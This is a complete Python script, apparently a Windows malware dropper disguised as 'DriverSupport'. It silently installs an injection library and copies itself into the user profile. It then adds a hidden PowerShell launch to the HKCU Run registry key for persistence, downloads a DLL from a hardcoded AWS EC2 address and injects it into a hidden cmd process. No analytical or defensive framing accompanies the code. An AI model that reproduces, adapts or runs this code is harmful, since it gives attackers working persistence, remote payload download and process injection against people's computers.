import subprocess
import sys

def silent_pip_install(packages):
    subprocess.check_call(
        [sys.executable, "-m", "pip", "install"] + packages,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )

silent_pip_install(["psutil", "pyinjector"])

import winreg as reg
import urllib.request
import os
import shutil
from pyinjector import inject

def copy_to_user_folder():
    user_folder = os.path.join(os.getenv("USERPROFILE"), "DriverSupport")
    
    os.makedirs(user_folder, exist_ok=True)

    script_destination = os.path.join(user_folder, os.path.basename(__file__))
    
    if not os.path.exists(script_destination):
        shutil.copy(__file__, script_destination)
        
    return script_destination

def download_dll(url, output_path):
    if os.path.exists(output_path):
        return
    os.makedirs(os.path.dirname(output_path), exist_ok=True)
    urllib.request.urlretrieve(url, output_path)

def add_to_startup(script_path):
    reg_key = r"Software\Microsoft\Windows\CurrentVersion\Run"
    reg_name = "DriverSupport"
    
    command = (
        f'cmd /c start /min "" powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command '
        f'"Start-Process py -ArgumentList \'{script_path}\' -WindowStyle Hidden"'
    )

    try:
        reg_handle = reg.OpenKey(reg.HKEY_CURRENT_USER, reg_key, 0, reg.KEY_READ)
        try:
            existing_value, reg_type = reg.QueryValueEx(reg_handle, reg_name)
            if existing_value == command:
                return
            else:
                reg_handle = reg.OpenKey(reg.HKEY_CURRENT_USER, reg_key, 0, reg.KEY_WRITE)
                reg.SetValueEx(reg_handle, reg_name, 0, reg.REG_SZ, command)
        except FileNotFoundError:
            reg_handle = reg.OpenKey(reg.HKEY_CURRENT_USER, reg_key, 0, reg.KEY_WRITE)
            reg.SetValueEx(reg_handle, reg_name, 0, reg.REG_SZ, command)
        finally:
            reg.CloseKey(reg_handle)
    except Exception as e:
        print(f"Erro ao adicionar ao registro: {e}")
        return

def create_dummy_process():
    process = subprocess.Popen(['cmd'], creationflags=subprocess.CREATE_NO_WINDOW, shell=True)
    return process.pid

script_in_user_folder = copy_to_user_folder()

add_to_startup(script_in_user_folder)

dll_url = 'http://ec2-3-84-149-132.compute-1.amazonaws.com:3232/windows_dll'
dll_path = os.path.join(os.getenv("USERPROFILE"), "DriverSupport", "windows_dll.dll")

dummy_pid = create_dummy_process()
download_dll(dll_url, dll_path)

if dummy_pid:
    inject(dummy_pid, dll_path)